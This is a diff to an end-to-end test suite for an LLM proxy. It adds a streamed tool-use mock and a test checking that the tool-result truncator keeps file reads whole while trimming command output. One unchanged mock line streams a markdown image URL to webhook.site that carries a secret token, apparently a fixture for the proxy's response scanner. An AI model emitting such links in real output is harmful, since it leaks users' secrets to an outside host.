@@ -240,6 +240,14 @@ describe('Proxy End-to-End (E2E) Suite', { timeout: 20000 }, () => {
         // across several writes (no Content-Length). This exercises the proxy's
         // passthrough de-chunking — a chunked upstream must reach the client
         // framed exactly once, not double-framed with hex sizes in the body.
+        if (body.includes('TOOL_USE_CASE')) {
+          // An assistant turn that calls two tools, streamed as Claude Code receives it.
+          res.writeHead(200, { 'Content-Type': 'text/event-stream' })
+          res.write('event: content_block_start\ndata: {"type":"content_block_start","index":0,"content_block":{"type":"tool_use","id":"toolu_e2e_read","name":"Read","input":{}}}\n\n')
+          res.write('event: content_block_start\ndata: {"type":"content_block_start","index":1,"content_block":{"type":"tool_use","id":"toolu_e2e_bash","name":"Bash","input":{}}}\n\n')
+          res.end('event: message_stop\ndata: {"type":"message_stop"}\n\n')
+          return
+        }
         if (body.includes('SSE_CASE')) {
           res.writeHead(200, { 'Content-Type': 'text/event-stream' })
           res.write('event: content_block_delta\ndata: {"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":"see ![c](https://webhook.site/abc-123?d=secret-token)"}}\n\n')
@@ -667,6 +675,42 @@ describe('Proxy End-to-End (E2E) Suite', { timeout: 20000 }, () => {
     } finally {
       testConfig.modules!.responseCache!.enabled = false
       testConfig.responseScan = savedScan
+    }
+  })
+
+  // Claude Code through the proxy continues a server-side thread: the request
+  // that carries a tool result does not carry the turn that named the tool.
+  // The truncator learns the name from the streamed response, so a file read
+  // stays whole (an elided one was read back, costing 24% more turns live)
+  // while command output is still cut.
+  it('E2E Case 11: the truncator leaves a thread continuation\'s file read whole', async () => {
+    const truncate = testConfig.modules!.toolResultTruncate!
+    const saved = structuredClone(truncate)
+    Object.assign(truncate, { enabled: true, headLines: 10, tailLines: 5, maxChars: 0, skipTools: ['Read'] })
+    try {
+      receivedRequests = []
+      const send = (payload: unknown) => sendProxyRequest(
+        testConfig.proxy.port, 'api.anthropic.com', mockUpstreamPort, 'POST', '/v1/messages',
+        { 'Content-Type': 'application/json' }, JSON.stringify(payload),
+      )
+      const first = await send({ model: 'claude-3-opus-20240229', stream: true, thread: { type: 'create' },
+        messages: [{ role: 'user', content: 'TOOL_USE_CASE read the file, then run the tests' }] })
+      expect(first.statusCode).toBe(200)
+
+      const long = Array.from({ length: 100 }, (_, i) => `line ${i + 1}`).join('\n')
+      const second = await send({ model: 'claude-3-opus-20240229', stream: true,
+        thread: { type: 'continue', previous_message_id: 'mock-msg-id' },
+        messages: [{ role: 'user', content: [
+          { type: 'tool_result', tool_use_id: 'toolu_e2e_read', content: long },
+          { type: 'tool_result', tool_use_id: 'toolu_e2e_bash', content: long },
+        ] }] })
+      expect(second.statusCode).toBe(200)
+      expect(receivedRequests).toHaveLength(2)
+      const [read, bash] = JSON.parse(receivedRequests[1]!.body).messages[0].content
+      expect(read.content).toBe(long)
+      expect(bash.content).toContain('[llm-fw: 85 lines elided]')
+    } finally {
+      Object.assign(truncate, saved)
     }
   })
 })
